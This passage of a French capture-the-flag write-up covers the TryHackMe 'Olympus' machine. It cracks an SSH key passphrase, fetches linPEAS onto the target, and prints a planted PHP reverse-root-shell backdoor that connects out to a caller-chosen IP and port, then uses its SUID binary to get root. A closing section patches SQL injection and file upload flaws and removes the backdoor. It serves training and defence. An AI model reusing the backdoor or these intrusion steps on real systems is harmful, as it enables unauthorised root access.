id_rsa:$sshng$6$16$0bafe08e57635a6dd91f469db7f167cc$1910$6f70656e7373682d6b65792d7631000000000a....SNIPPED....9aabeec4233ed22bff871fd9028a1babbd95bf5fb7acd05eca37ac226e8aecb8600c1036100f6145778980a0da197699f2ab0961b0a5e0ed338528509cc5dd7bcef97916633c1232d6b8c852259ee8b4b54e8132a9f6$16$486
```


---

### JOHN
Maintenant, nous pouvons le casser avec john pour trouver la passphrase :
```bash
john ssh_hash       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
...
Proceeding with wordlist:/usr/share/john/password.lst
s*******e        (id_rsa)     
...
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Nous venons de trouver la passphrase pour la **clé privée ssh** :
- s*******e

---
## SSH ZEUS user
Maintenant, nous pouvons essayer de nous connecter au ssh avec cette clé privée :
- mettre la clé du fichier id_rsa dans ~/.ssh/
- chmod 600 l'id_rsa
- connectez-vous avec la clé et la passphrase :
```bash
ssh zeus@olympus.thm -i /home/freekali/.ssh/THM_olympus_id_rsa
Enter passphrase for key '/home/freekali/.ssh/THM_olympus_id_rsa': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 01 Mar 2023 02:15:30 PM UTC

  System load:  0.0               Processes:             128
  Usage of /:   44.4% of 9.78GB   Users logged in:       0
  Memory usage: 70%               IPv4 address for eth0: 10.10.207.20
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ 
```

## ROOT PRIVESC

On peut essayer de télécharger linPEAS.sh pour énumérer :
- télécharger linpeas.sh https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- créer un serveur HTTP avec python3 : ```python3 -m http.server 9090```
- téléchargez le script dans la machine cible : ```wget http://VOTREIP:9090/linpeas.sh```
- lancez linpeas.sh :
```bash
...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.4.0-109-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022
User & Groups: uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
Hostname: olympus
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.4.0-109-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.4 LTS
Release:	20.04
Codename:	focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Potentially Vulnerable to CVE-2022-2588

...
                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sorry, try again.

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

...

```
Ok, rien d'intéressant avec linPEAS.sh, il faut énumérer manuellement

Nous avons trouvé un fichier intéressant **'VIGQFQFMYOST.php'** dans le dossier **/var/www/html/**:
```bash
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php 
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
```
Ok, c'est une **backdoor** qui utilise ```/lib/defended/libc.so.99``` pour devenir **root** sur la machine :

```bash
zeus@olympus:/$ ./lib/defended/libc.so.99
$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
$ ls 
bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var
$ cd root
$ ls
config	root.flag  snap
$ cat root.flag	
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{***Flag***}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```



# ROOTED

```bash
$ grep -rni "flag{" /etc/
/etc/ssl/private/.b0nus.fl4g:3:flag{Y0u_G0t_m3_g00d!}
/etc/ssl/private/.b0nus.fl4g:8:grep -irl flag{
$ cat /etc/ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{***Flag***}


As a reminder, here is a usefull regex :

grep -irl flag{




Hope you liked the room ;)

```


---
# FIX 
## SQL Injection sur search.php
```php
<?php include 'includes/header.php';?>
        <!-- Navigation Bar -->
   <?php include 'includes/navbar.php';?>
        <!-- Navigation Bar -->

    <div class="container">
        <div class="row">
	        <!-- Page Content -->
	        <div class="col-md-8">
            <h1 class="page-header">Heading<small>Secondary Text</small></h1>
            <?php
if (isset($_POST['submit'])) {
	$search = $_POST["search"];

	$query = "SELECT * FROM posts WHERE post_tags LIKE '%$search%' AND post_status='publish'";
	$search_query = mysqli_query($con, $query);
	if (!$search_query) {
		die("Query Fail" . mysqli_error($con));
	}
	$count = mysqli_num_rows($search_query);
	if ($count == 0) {
		echo "<h1>No result</h1>";
	} else {
		while ($row = mysqli_fetch_assoc($search_query)) {
			$post_title = $row['post_title'];
			$post_id = $row['post_id'];
			$post_category_id = $row['post_category_id'];
			$post_author = $row['post_author'];
			$post_date = $row['post_date'];
			$post_image = $row['post_image'];
			$post_content = $row['post_content'];
			$post_tags = $row['post_tags'];
			$post_comment_count = $row['post_comment_count'];
			$post_status = $row['post_status'];
			?>
		<!-- Post Area-->

	        	<p><h2><a href="#"><?php echo $post_title; ?></a></h2></p>
	        	<p><h3>by <a href="#"><?php echo $post_author; ?></a></h3></p>
	        	<p><span class="glyphicon glyphicon-time"></span>Posted on <?php echo $post_date; ?></p>
	        	<hr>
	        	<img class="img-responsive img-rounded" src="img/<?php echo $post_image; ?>" alt="900 * 300">
	        	<hr>
	        	<p><?php echo substr($post_content, 0, 300) . '.........'; ?></p>
	        		<a href="post.php?post=<?php echo $post_id; ?>"><button type="button" class="btn btn-primary">Read More<span class="glyphicon glyphicon-chevron-right"></span></button></a>
	        	<hr>
	        	<!-- Post Area -->
	        	<?php }
	}
}
?>





	        	<hr>
	        	<ul class="pager">
				  <li class="previous"><a href="#"><span class="glyphicon glyphicon-arrow-left"></span> Older</a></li>
				  <li class="next"><a href="#">Newer <span class="glyphicon glyphicon-arrow-right"></span></a></li>
				</ul>
	        </div>
	        <!-- Page Content -->
	        <!-- Side Content -->
	        <div class="col-md-4">

               <?php include 'includes/sidebar.php';
?>

	        </div>
	        <!-- Sde Content -->
        </div>

        <!-- Footer -->
        <?php include 'includes/footer.php';?>
        <!-- Footer -->
    </div>
  <script src="js/jquery.js"></script>
  <script src="js/bootstrap.min.js"></script>
  ?>
```
Pour vous protéger contre les **injections SQL** dans ce script, vous devez utiliser des **prepared statements** avec des requêtes paramétrées au lieu de concaténer directement l'entrée de l'utilisateur dans la requête SQL.

Il s'agit d'une correction possible du fichier **search.php** avec des **prepared statements** :
```php
<?php include 'includes/header.php';?>
<!-- Navigation Bar -->
<?php include 'includes/navbar.php';?>
<!-- Navigation Bar -->

<div class="container">
    <div class="row">
        <!-- Page Content -->
        <div class="col-md-8">
            <h1 class="page-header">Heading<small>Secondary Text</small></h1>
            <?php
            if (isset($_POST['submit'])) {
                $search = $_POST["search"];

                $query = "SELECT * FROM posts WHERE post_tags LIKE ? AND post_status='publish'";
                $stmt = mysqli_prepare($con, $query);
                mysqli_stmt_bind_param($stmt, "s", $search);
                mysqli_stmt_execute($stmt);
                $search_query = mysqli_stmt_get_result($stmt);
                if (!$search_query) {
                    die("Query Fail" . mysqli_error($con));
                }
                $count = mysqli_num_rows($search_query);
                if ($count == 0) {
                    echo "<h1>No result</h1>";
                } else {
                    while ($row = mysqli_fetch_assoc($search_query)) {
                        $post_title = $row['post_title'];
                        $post_id = $row['post_id'];
                        $post_category_id = $row['post_category_id'];
                        $post_author = $row['post_author'];
                        $post_date = $row['post_date'];
                        $post_image = $row['post_image'];
                        $post_content = $row['post_content'];
                        $post_tags = $row['post_tags'];
                        $post_comment_count = $row['post_comment_count'];
                        $post_status = $row['post_status'];
            ?>
                        <!-- Post Area-->

                        <p><h2><a href="#"><?php echo $post_title; ?></a></h2></p>
                        <p><h3>by <a href="#"><?php echo $post_author; ?></a></h3></p>
                        <p><span class="glyphicon glyphicon-time"></span>Posted on <?php echo $post_date; ?></p>
                        <hr>
                        <img class="img-responsive img-rounded" src="img/<?php echo $post_image; ?>" alt="900 * 300">
                        <hr>
                        <p><?php echo substr($post_content, 0, 300) . '.........'; ?></p>
                        <a href="post.php?post=<?php echo $post_id; ?>"><button type="button" class="btn btn-primary">Read More<span class="glyphicon glyphicon-chevron-right"></span></button></a>
                        <hr>
                        <!-- Post Area -->
            <?php
                    }
                }
            }
	?>
```

## File Upload 
Original upload.php
```php                                    
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
  if($check !== false) {
    echo "File is an image - " . $check["mime"] . ".";
    $uploadOk = 1;
  } else {
    echo "File is not an image.";
    $uploadOk = 0;
  }
}

// Check if file already exists
if (file_exists($target_file)) {
  echo "Sorry, file already exists.";
  $uploadOk = 0;
}

// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
  echo "Sorry, your file is too large.";
  $uploadOk = 0;
}

// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
  $uploadOk = 0;
}

// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?>
```

Voila une correction pour vérifier le 'MIME TYPE' du fichier uploadé pour vérifier si c'est bien une image :
```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

// Check if file is an actual image
if(isset($_POST["submit"])) {
  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
  if($check !== false) {
    $uploadOk = 1;
  } else {
    echo "File is not an image.";
    $uploadOk = 0;
  }
}

// Check if file already exists
if (file_exists($target_file)) {
  echo "Sorry, file already exists.";
  $uploadOk = 0;
}

// Allow only certain file formats
$allowedExtensions = array("jpg", "jpeg", "png", "gif");
if(!in_array($imageFileType, $allowedExtensions)) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
  $uploadOk = 0;
}

// Check file type using finfo_file function
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$fileType = finfo_file($finfo, $_FILES["fileToUpload"]["tmp_name"]);
$allowedMIMETypes = array("image/jpeg", "image/png", "image/gif");
if(!in_array($fileType, $allowedMIMETypes)) {
  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
  $uploadOk = 0;
}
finfo_close($finfo);

// Check if $uploadOk is set to 0 by an error or file format check
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?>
```


## Binaire SUID
Changer les permissions du fichier **/lib/defended/libc.so.99** :
```bash
root@olympus:/var/www/chat.olympus.thm/public_html$ ls -lsa /lib/defended/libc.so.99
20 -rwsr-xr-x 1 root root 16784 Apr 14  2022 /lib/defended/libc.so.99
root@olympus:/var/www/chat.olympus.thm/public_html$ chmod 700 /lib/defended/libc.so.99
root@olympus:/var/www/chat.olympus.thm/public_html$ ls -lsa /lib/defended/libc.so.99
20 -rwx------ 1 root root 16784 Apr 14  2022 /lib/defended/libc.so.99
```


## Remove Backdoor
Supprimer le fichier backdoor **VIGQFQFMYOST.php*** :
```bash
root@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
total 12
drwxrwx--x 2 root     zeus     4096 Jul 15  2022 .
drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
-rwxr-xr-x 1 root     zeus     1589 Jul 15  2022 VIGQFQFMYOST.php
root@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ rm VIGQFQFMYOST.php 
root@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
total 8
drwxrwx--x 2 root     zeus     4096 Mar  2 07:18 .
drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html

```

---
# Thanks for reading 
